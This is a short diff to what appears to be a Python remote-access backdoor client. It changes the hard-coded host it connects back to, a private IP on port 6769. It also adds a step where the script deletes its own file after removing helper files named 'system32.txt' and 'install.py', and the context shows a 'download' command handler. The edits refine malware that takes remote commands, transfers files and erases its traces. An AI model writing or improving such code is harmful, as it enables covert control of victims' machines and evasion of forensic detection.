@@ -16,7 +16,8 @@ def socket_create():
         global s
         global spava
         spava = False
-        host = '192.168.8.134'
+        #host = '192.168.8.134'
+        host = '192.168.1.2'
         port = 6769
         s = socket.socket()
     except socket.error as msg:
@@ -104,6 +105,9 @@ def receive_commands():
                 os.remove("system32.txt")
             if os.path.exists("install.py"):
                 os.remove("install.py")
+                
+            dir = os.getcwd()
+            os.remove(dir+'\%s' % sys.argv[0])
             os._exit(1)
 
         elif data[:8].decode("utf-8") == "download":
